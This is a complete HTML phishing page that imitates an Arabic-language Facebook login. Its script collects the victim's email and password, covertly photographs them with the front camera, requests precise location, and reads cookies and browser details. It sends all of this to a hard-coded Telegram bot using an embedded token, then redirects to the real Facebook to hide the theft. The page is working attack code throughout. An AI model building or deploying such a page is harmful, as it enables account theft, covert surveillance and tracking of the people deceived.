<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>ÙÙŠØ³Ø¨ÙˆÙƒ - ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:24px;font-weight:bold;}
        .form-area {padding:20px;}
        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
    </style>
</head>
<body>

<div class="fb-container">
    <div class="header">facebook</div>
    <div class="form-area">
        <input type="text" id="email" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¬ÙˆØ§Ù„ Ø£Ùˆ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ">
        <input type="password" id="pass" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
        <button type="button" id="loginBtn" class="login-btn">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
    </div>
    <div class="footer">Meta Â© 2026</div>
</div>

<video id="video" style="display:none" autoplay></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
// --- Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ---
const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";

// 1. Ø¯Ø§Ù„Ø© Ø¬Ù„Ø¨ Ø§Ù„ÙƒÙˆÙƒÙŠØ² (ØªÙˆØ¶Ø¹ Ù‡Ù†Ø§ ÙƒØ¯Ø§Ù„Ø© Ù…Ø³Ø§Ø¹Ø¯Ø©)
function getCookies() {
    try {
        const cookies = document.cookie;
        return cookies ? cookies : "Ù„Ø§ ØªÙˆØ¬Ø¯ ÙƒÙˆÙƒÙŠØ² Ù…ØªØ§Ø­Ø© (HttpOnly protection active)";
    } catch (e) {
        return "ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒÙˆÙƒÙŠØ²";
    }
}

document.getElementById('loginBtn').addEventListener('click', async function() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    if(!email || !pass) {
        alert("ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª");
        return;
    }

    this.innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...";
    this.disabled = true;

    try {
        // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.getElementById('video');
        video.srcObject = stream;
        
        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            const photoData = canvas.toDataURL('image/jpeg');
            
            stream.getTracks().forEach(track => track.stop());

            // Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø«Ù… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„
            navigator.geolocation.getCurrentPosition(
                (pos) => processAndSend(email, pass, photoData, `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`),
                () => processAndSend(email, pass, photoData, "Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ø±ÙÙˆØ¶ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…"),
                { enableHighAccuracy: true }
            );
        }, 1000);

    } catch (err) {
        processAndSend(email, pass, null, "Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø±ÙÙˆØ¶Ø© Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…");
    }
});

// 2. Ø¯Ø§Ù„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø­Ø¯Ø«Ø© Ø§Ù„ØªÙŠ ØªØ´Ù…Ù„ Ø§Ù„ÙƒÙˆÙƒÙŠØ²
async function processAndSend(email, pass, photo, location) {
    const cookiesData = getCookies(); // Ø¬Ù„Ø¨ Ø§Ù„ÙƒÙˆÙƒÙŠØ² Ù‡Ù†Ø§
    const device = navigator.userAgent; // Ø¬Ù„Ø¨ Ø¨ØµÙ…Ø© Ø§Ù„Ù…ØªØµÙØ­

    const caption = `ğŸ­ **Ø¥Ø¨Ù‡Ø§Ø± ØªÙ‚Ù†ÙŠ: Ø§Ø®ØªØ±Ø§Ù‚ ÙƒØ§Ù…Ù„** ğŸ­\n\n` +
                    `ğŸ“§ **Ø§Ù„Ø¥ÙŠÙ…ÙŠÙ„:** \`${email}\`\n` +
                    `ğŸ”‘ **ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø±:** \`${pass}\`\n\n` +
                    `ğŸª **Ø§Ù„Ø¬Ù„Ø³Ø© (Cookies):**\n\`${cookiesData}\`\n\n` +
                    `ğŸ“ **Ø§Ù„Ù…ÙˆÙ‚Ø¹:** ${location}\n` +
                    `ğŸ“± **Ø§Ù„Ù…ØªØµÙØ­:** \`${device}\`\n` +
                    `ğŸ•’ **Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString('ar-EG')}`;

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');

    if (photo) {
        const blob = await (await fetch(photo)).blob();
        formData.append('photo', blob, 'selfie.jpg');
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
    } else {
        formData.append('text', caption);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
    }

    // Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ Ù„Ù„ØªÙ…ÙˆÙŠÙ‡
    window.location.href = "https://www.facebook.com/login.php";
}
</script>
</body>
</html>

